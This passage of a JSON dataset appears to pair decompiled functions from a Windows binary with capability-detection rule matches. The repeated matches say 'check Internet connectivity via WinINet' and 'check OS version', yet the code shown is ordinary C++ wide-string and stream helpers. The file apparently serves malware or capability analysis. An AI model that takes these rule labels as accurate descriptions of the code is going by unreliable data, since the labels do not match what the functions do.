*piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        fcn.1400bc6c0(puVar7 + -0xc);\n    }\n    *arg1 = iVar8;\ncode_r0x000140074594:\n    *(iVar8 + -8) = 0;\n    *(iVar8 + -0x18) = arg1_00;\n    *(iVar8 + arg1_00 * 2) = 0;\n    return;\n}\n",
        "token_count": 950
    },
    "140072fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140072fb0(int64_t *arg1, ushort *arg2, uint64_t arg3)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    int64_t iVar5;\n    int64_t *arg1_00;\n    int64_t iVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    \n    if (arg3 == 0) {\n        return arg1;\n    }\n    puVar4 = *arg1;\n    puVar7 = *(puVar4 + -0xc);\n    if (0x1ffffffffffffffcU - puVar7 < arg3) {\n        arg1_00 = 0x14010ac9e;\n        fcn.1400bd360(0x14010ac9e);\n        puVar4 = *puVar7;\n        iVar8 = *(puVar4 + -0xc);\n        if (iVar8 == 0) {\n            return arg1_00;\n        }\n        iVar5 = *arg1_00;\n        iVar6 = *(iVar5 + -0x18);\n        uVar2 = iVar6 + iVar8;\n        if (uVar2 <= *(iVar5 + -0x10)) {\n            if (**0x14010fc90 == 0) {\n                if (*(iVar5 + -8) < 1) goto code_r0x000140073100;\n            }\n            else if (*(iVar5 + -8) < 1) {\n                iVar5 = *arg1_00;\n                puVar4 = *puVar7;\n                iVar6 = *(iVar5 + -0x18);\n                goto code_r0x000140073100;\n            }\n        }\n        fcn.1400743c0(arg1_00, uVar2);\n        iVar5 = *arg1_00;\n        puVar4 = *puVar7;\n        iVar6 = *(iVar5 + -0x18);\ncode_r0x000140073100:\n        puVar3 = iVar5 + iVar6 * 2;\n        if (iVar8 == 1) {\n            *puVar3 = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, puVar4, iVar8 * 2);\n            iVar5 = *arg1_00;\n        }\n        *(iVar5 + -8) = 0;\n        *(iVar5 + -0x18) = uVar2;\n        *(iVar5 + uVar2 * 2) = 0;\n        return arg1_00;\n    }\n    uVar2 = arg3 + puVar7;\n    if (*(puVar4 + -8) < uVar2) {\ncode_r0x000140072ff1:\n        if ((arg2 < puVar4) || (puVar4 + *(puVar4 + -0xc) < arg2)) {\n            fcn.1400743c0(arg1, uVar2);\n            puVar4 = *arg1;\n            puVar7 = *(puVar4 + -0xc);\ncode_r0x000140073015:\n            puVar3 = puVar4 + puVar7;\n            goto joined_r0x000140073070;\n        }\n        iVar8 = arg2 - puVar4;\n        fcn.1400743c0(arg1, uVar2);\n        puVar4 = *arg1;\n        arg2 = iVar8 + puVar4;\n    }\n    else {\n        if (**0x14010fc90 == 0) {\n            if (0 < *(puVar4 + -4)) goto code_r0x000140072ff1;\n            goto code_r0x000140073015;\n        }\n        piVar1 = puVar4 + -4;\n        puVar4 = *arg1;\n        if (0 < *piVar1) goto code_r0x000140072ff1;\n    }\n    puVar3 = puVar4 + *(puVar4 + -0xc);\njoined_r0x000140073070:\n    if (arg3 == 1) {\n        *puVar3 = *arg2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar3, arg2, arg3 * 2);\n        puVar4 = *arg1;\n    }\n    *(puVar4 + -4) = 0;\n    *(puVar4 + -0xc) = uVar2;\n    puVar4[uVar2] = 0;\n    return arg1;\n}\n",
        "token_count": 992
    },
    "1400730c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400730c0(int64_t *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    ushort *puVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ushort *puVar5;\n    \n    puVar5 = *arg2;\n    iVar2 = *(puVar5 + -0xc);\n    if (iVar2 == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    iVar4 = *(iVar3 + -0x18);\n    arg2_00 = iVar4 + iVar2;\n    if (arg2_00 <= *(iVar3 + -0x10)) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar3 + -8) < 1) goto code_r0x000140073100;\n        }\n        else if (*(iVar3 + -8) < 1) {\n            iVar3 = *arg1;\n            puVar5 = *arg2;\n            iVar4 = *(iVar3 + -0x18);\n            goto code_r0x000140073100;\n        }\n    }\n    fcn.1400743c0(arg1, arg2_00);\n    iVar3 = *arg1;\n    puVar5 = *arg2;\n    iVar4 = *(iVar3 + -0x18);\ncode_r0x000140073100:\n    puVar1 = iVar3 + iVar4 * 2;\n    if (iVar2 == 1) {\n        *puVar1 = *puVar5;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar1, puVar5, iVar2 * 2);\n        iVar3 = *arg1;\n    }\n    *(iVar3 + -8) = 0;\n    *(iVar3 + -0x18) = arg2_00;\n    *(iVar3 + arg2_00 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 439
    },
    "14007328": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.140073280(int64_t **arg1, uint64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    ushort *puVar2;\n    int64_t *piVar3;\n    uint64_t uVar4;\n    int64_t **ppiVar5;\n    int64_t **ppiVar6;\n    \n    if (arg2 == 0) {\n        return arg1;\n    }\n    ppiVar6 = *arg1;\n    piVar3 = ppiVar6[-3];\n    if (0x1ffffffffffffffcU - piVar3 < arg2) {\n        ppiVar5 = 0x14010ac9e;\n        fcn.1400bd360(0x14010ac9e);\n        piVar3 = *ppiVar5;\n        if (*(piVar3 + -1) < 0) {\n            *(piVar3 + -1) = 0;\n        }\n        piVar1 = *ppiVar6;\n        if (*(piVar1 + -1) < 0) {\n            *(piVar1 + -1) = 0;\n        }\n        *ppiVar5 = piVar1;\n        *ppiVar6 = piVar3;\n        return ppiVar5;\n    }\n    piVar1 = arg2 + piVar3;\n    if (piVar1 <= ppiVar6[-2]) {\n        if (**0x14010fc90 == 0) {\n            if (*(ppiVar6 + -1) < 1) goto code_r0x0001400732ee;\n        }\n        else if (*(ppiVar6 + -1) < 1) {\n            ppiVar6 = *arg1;\n            piVar3 = ppiVar6[-3];\n            goto code_r0x0001400732ee;\n        }\n    }\n    fcn.1400743c0(arg1, piVar1);\n    ppiVar6 = *arg1;\n    piVar3 = ppiVar6[-3];\ncode_r0x0001400732ee:\n    puVar2 = ppiVar6 + piVar3 * 2;\n    uVar4 = 0;\n    if (arg2 == 1) {\n        *puVar2 = arg3;\n    }\n    else {\n        do {\n            puVar2[uVar4] = arg3;\n            uVar4 = uVar4 + 1;\n        } while (arg2 != uVar4);\n    }\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = piVar1;\n    *(ppiVar6 + piVar1 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 588
    },
    "1400733d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400733d0(int64_t **arg1, int64_t **arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    uchar auStack81 [9];\n    int64_t *piStack72;\n    int64_t **ppiStack64;\n    \n    ppiVar6 = *arg1;\n    piVar5 = ppiVar6[-3];\n    if (0x1ffffffffffffffc < arg3) {\n        ppiVar6 = 0x14010ac89;\n        ppiStack64 = 0x140073527;\n        fcn.1400bd360(0x14010ac89);\n        piVar4 = *0x14010fc90;\n        piVar5 = *arg2;\n        if (*ppiVar6 != piVar5) {\n            piStack72 = arg3;\n            ppiStack64 = arg1;\n            if (*(piVar5 + -1) < 0) {\n                piVar5 = fcn.140072b30(piVar5 + -3, &stack0xffffffffffffffaf, 0);\n                piVar3 = *ppiVar6;\n                iVar2 = **0x14010fc90;\n            }\n            else {\n                if (**0x14010fc90 == 0) {\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                else {\n                    LOCK();\n                    *(piVar5 + -1) = *(piVar5 + -1) + 1;\n                }\n                iVar2 = *piVar4;\n                piVar3 = *ppiVar6;\n            }\n            if (iVar2 == 0) {\n                iVar2 = *(piVar3 + -1);\n                *(piVar3 + -1) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = piVar3 + -1;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                fcn.1400bc6c0(piVar3 + -3);\n            }\n            *ppiVar6 = piVar5;\n            return ppiVar6;\n        }\n        return ppiVar6;\n    }\n    if ((arg2 < ppiVar6) || (ppiVar6 + piVar5 * 2 < arg2)) {\ncode_r0x000140073490:\n        ppiStack64 = 0x14007349d;\n        fcn.1400744d0(arg1, 0, piVar5, arg3);\n        if (arg3 == NULL) {\n            return arg1;\n        }\n        if (arg3 == 0x1) {\n            **arg1 = *arg2;\n            return arg1;\n        }\n        ppiStack64 = 0x1400734b7;\n        sub.msvcrt.dll_memcpy(*arg1, arg2, arg3 * 2);\n        return arg1;\n    }\n    if (**0x14010fc90 == 0) {\n        if (0 < *(ppiVar6 + -1)) goto code_r0x000140073490;\n    }\n    else {\n        if (0 < *(ppiVar6 + -1)) {\n            piVar5 = (*arg1)[-3];\n            goto code_r0x000140073490;\n        }\n        ppiVar6 = *arg1;\n    }\n    piVar5 = arg2 - ppiVar6 >> 1;\n    if (piVar5 < arg3) {\n        if (piVar5 == NULL) goto code_r0x000140073460;\n        if (arg3 != 0x1) {\n            ppiStack64 = 0x140073453;\n            sub.msvcrt.dll_memmove(ppiVar6, arg2);\n            ppiVar6 = *arg1;\n            goto code_r0x000140073460;\n        }\n    }\n    else if (arg3 != 0x1) {\n        if (arg3 != NULL) {\n            ppiStack64 = 0x1400734f7;\n            sub.msvcrt.dll_memcpy(ppiVar6, arg2, arg3 * 2);\n            ppiVar6 = *arg1;\n        }\n        goto code_r0x000140073460;\n    }\n    *ppiVar6 = *arg2;\ncode_r0x000140073460:\n    *(ppiVar6 + -1) = 0;\n    ppiVar6[-3] = arg3;\n    *(ppiVar6 + arg3 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 1055
    },
    "140073bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t ** fcn.140073bc0(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int64_t *piVar8;\n    int64_t iVar9;\n    int64_t **ppiVar10;\n    int64_t iVar11;\n    int64_t **ppiVar12;\n    char *pcVar13;\n    uint64_t uVar14;\n    int64_t *piVar15;\n    uint64_t uVar16;\n    int64_t in_R8;\n    \n    piVar7 = *0x14010fc90;\n    ppiVar10 = (*arg1)[-3];\n    if (0x1ffffffffffffffc < arg2) {\n        pcVar13 = \"basic_string::resize\";\n        ppiVar10 = fcn.1400bd360(\"basic_string::resize\");\n        if (in_R8 == 1) {\n            uVar5 = *arg2;\n            *pcVar13 = uVar5;\n            return uVar5;\n        }\n        if (in_R8 != 0) {\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppiVar10 = (*_sym.imp.msvcrt.dll_memcpy)();\n            return ppiVar10;\n        }\n        return ppiVar10;\n    }\n    if (ppiVar10 < arg2) {\n        uVar14 = arg2 - ppiVar10;\n        if (uVar14 == 0) {\n            return arg1;\n        }\n        ppiVar10 = *arg1;\n        piVar8 = ppiVar10[-3];\n        if (0x1ffffffffffffffcU - piVar8 < uVar14) {\n            ppiVar12 = 0x14010ac9e;\n            fcn.1400bd360(0x14010ac9e);\n            piVar8 = *ppiVar12;\n            if (*(piVar8 + -1) < 0) {\n                *(piVar8 + -1) = 0;\n            }\n            piVar15 = *ppiVar10;\n            if (*(piVar15 + -1) < 0) {\n                *(piVar15 + -1) = 0;\n            }\n            *ppiVar12 = piVar15;\n            *ppiVar10 = piVar8;\n            return ppiVar12;\n        }\n        piVar15 = uVar14 + piVar8;\n        if (piVar15 <= ppiVar10[-2]) {\n            if (**0x14010fc90 == 0) {\n                if (*(ppiVar10 + -1) < 1) goto code_r0x0001400732ee;\n            }\n            else if (*(ppiVar10 + -1) < 1) {\n                ppiVar10 = *arg1;\n                piVar8 = ppiVar10[-3];\n                goto code_r0x0001400732ee;\n            }\n        }\n        fcn.1400743c0(arg1, piVar15);\n        ppiVar10 = *arg1;\n        piVar8 = ppiVar10[-3];\ncode_r0x0001400732ee:\n        puVar3 = ppiVar10 + piVar8 * 2;\n        uVar16 = 0;\n        if (uVar14 == 1) {\n            *puVar3 = in_R8;\n        }\n        else {\n            do {\n                puVar3[uVar16] = in_R8;\n                uVar16 = uVar16 + 1;\n            } while (uVar14 != uVar16);\n        }\n        *(ppiVar10 + -1) = 0;\n        ppiVar10[-3] = piVar15;\n        *(ppiVar10 + piVar15 * 2) = 0;\n        return arg1;\n    }\n    if (ppiVar10 <= arg2) {\n        return ppiVar10;\n    }\n    iVar9 = ppiVar10 - arg2;\n    piVar8 = *arg1;\n    iVar2 = iVar9 + arg2;\n    uVar14 = piVar8[-2];\n    uVar16 = piVar8[-3] - iVar9;\n    iVar11 = piVar8[-3] - iVar2;\n    if (uVar16 <= uVar14) {\n        if (**0x14010fc90 == 0) {\n            if (*(piVar8 + -1) < 1) {\ncode_r0x000140074613:\n                if ((iVar11 != 0) && (iVar9 != 0)) {\n                    puVar3 = piVar8 + iVar2 * 2;\n                    puVar4 = piVar8 + arg2 * 2;\n                    if (iVar11 == 1) {\n                        *puVar4 = *puVar3;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar4, puVar3, iVar11 * 2);\n                        piVar8 = *arg1;\n                    }\n                }\n                goto code_r0x000140074594;\n            }\n        }\n        else {\n            if (*(piVar8 + -1) < 1) {\n                piVar8 = *arg1;\n                goto code_r0x000140074613;\n            }\n            uVar14 = (*arg1)[-2];\n        }\n    }\n    iVar9 = fcn.140072ba0(uVar16, uVar14);\n    piVar15 = *arg1;\n    piVar8 = iVar9 + 0x18;\n    if (arg2 == NULL) {\ncode_r0x000140074577:\n        if (iVar11 == 0) goto code_r0x00014007457c;\ncode_r0x0001400745c0:\n        puVar3 = piVar15 + iVar2 * 2;\n        puVar4 = iVar9 + 0x18 + arg2 * 2;\n        if (iVar11 == 1) {\n            *puVar4 = *puVar3;\n            goto code_r0x00014007457c;\n        }\n        sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar11 * 2);\n        piVar15 = *arg1;\n        if (*piVar7 == 0) goto code_r0x000140074584;\ncode_r0x0001400745ed:\n        LOCK();\n        piVar1 = piVar15 + -1;\n        iVar6 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    else {\n        if (arg2 != 0x1) {\n            sub.msvcrt.dll_memcpy(piVar8, piVar15, arg2 * 2);\n            piVar15 = *arg1;\n            goto code_r0x000140074577;\n        }\n        *(iVar9 + 0x18) = *piVar15;\n        if (iVar11 != 0) goto code_r0x0001400745c0;\ncode_r0x00014007457c:\n        if (*piVar7 != 0) goto code_r0x0001400745ed;\ncode_r0x000140074584:\n        iVar6 = *(piVar15 + -1);\n        *(piVar15 + -1) = iVar6 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.1400bc6c0(piVar15 + -3);\n    }\n    *arg1 = piVar8;\ncode_r0x000140074594:\n    *(piVar8 + -1) = 0;\n    piVar8[-3] = uVar16;\n    *(piVar8 + uVar16 * 2) = 0;\n    return NULL;\n}\n",
        "token_count": 1729
    },
    "140073fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140073fb0(int64_t *arg1, ulong *arg2, uint64_t arg3, ushort *arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    ushort *puVar5;\n    ulong *arg4_00;\n    uint64_t arg3_00;\n    int64_t iVar6;\n    ulong unaff_R15;\n    uint64_t in_stack_00000028;\n    \n    piVar1 = *0x14010fc90;\n    puVar3 = *arg1;\n    arg4_00 = *(puVar3 + -0xc);\n    if (arg4_00 < arg2) {\ncode_r0x0001400741dc:\n        arg1_00 = fcn.1400b7b60(0x14010ab70, 0x14010ac73, arg2, arg4_00);\n        fcn.140072a20(arg4 + -0xc);\n        fcn.140014f30(arg1_00);\n        piVar4 = fcn.140073fb0(arg1_00, unaff_R15, arg2, *arg4_00);\n        return piVar4;\n    }\n    arg3_00 = arg4_00 - arg2;\n    if (arg3 < arg4_00 - arg2) {\n        arg3_00 = arg3;\n    }\n    if ((0x1ffffffffffffffc - arg4_00) + arg3_00 < in_stack_00000028) {\n        fcn.1400bd360(0x14010ac73);\n        goto code_r0x0001400741dc;\n    }\n    if ((arg4 < puVar3) || (puVar3 + arg4_00 < arg4)) {\ncode_r0x0001400740d0:\n        fcn.1400744d0(arg1, arg2, arg3_00, in_stack_00000028);\n        if (in_stack_00000028 != 0) {\n            puVar3 = *arg1 + arg2 * 2;\n            if (in_stack_00000028 == 1) {\n                *puVar3 = *arg4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar3, arg4, in_stack_00000028 * 2);\n            }\n        }\n    }\n    else {\n        if (**0x14010fc90 == 0) {\n            if (0 < *(puVar3 + -4)) goto code_r0x0001400740d0;\n        }\n        else {\n            if (0 < *(puVar3 + -4)) goto code_r0x0001400740d0;\n            puVar3 = *arg1;\n        }\n        if (puVar3 + arg2 < arg4 + in_stack_00000028) {\n            if (arg4 < puVar3 + arg2 + arg3_00) {\n                puVar3 = fcn.1400724b0(arg4, arg4 + in_stack_00000028);\n                fcn.1400744d0(arg1, arg2, arg3_00, in_stack_00000028);\n                if (in_stack_00000028 != 0) {\n                    puVar5 = arg2 * 2 + *arg1;\n                    if (in_stack_00000028 == 1) {\n                        *puVar5 = *puVar3;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(puVar5, puVar3, in_stack_00000028 * 2);\n                    }\n                }\n                if (*piVar1 == 0) {\n                    iVar2 = *(puVar3 + -4);\n                    *(puVar3 + -4) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = puVar3 + -4;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (0 < iVar2) {\n                    return arg1;\n                }\n                fcn.1400bc6c0(puVar3 + -0xc);\n                return arg1;\n            }\n            iVar6 = (in_stack_00000028 - arg3_00) + (arg4 - puVar3 >> 1);\n        }\n        else {\n            iVar6 = arg4 - puVar3 >> 1;\n        }\n        fcn.1400744d0(arg1, arg2, arg3_00, in_stack_00000028);\n        puVar3 = *arg1 + iVar6 * 2;\n        puVar5 = *arg1 + arg2 * 2;\n        if (in_stack_00000028 == 1) {\n            *puVar5 = *puVar3;\n        }\n        else if (in_stack_00000028 != 0) {\n            sub.msvcrt.dll_memcpy(puVar5, puVar3, in_stack_00000028 * 2);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1117
    },
    "1400b4ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400b4ab0(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char *in_RAX;\n    char *arg1_00;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [8];\n    \n    if (*(arg1 + 0xe8) == 0) {\n        arg2._0_4_ = arg2 | 1;\n    }\n    *(arg1 + 0x20) = arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg2_00 = arg2;\n    if (arg2 == 0) {\n        return in_RAX;\n    }\n    arg1_00 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    fcn.1400a59d0(arg1_00, arg2_00 + 0xd0);\n    fcn.1400b3230(auStack88, arg2_00, in_R8);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b47a0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.1400a59d0(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.1400a5b40(piVar1 + 7, in_R8);\n        fcn.1400a5ae0(auStack88);\n    }\n    return arg1_00;\n}\n",
        "token_count": 391
    },
    "14007968": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
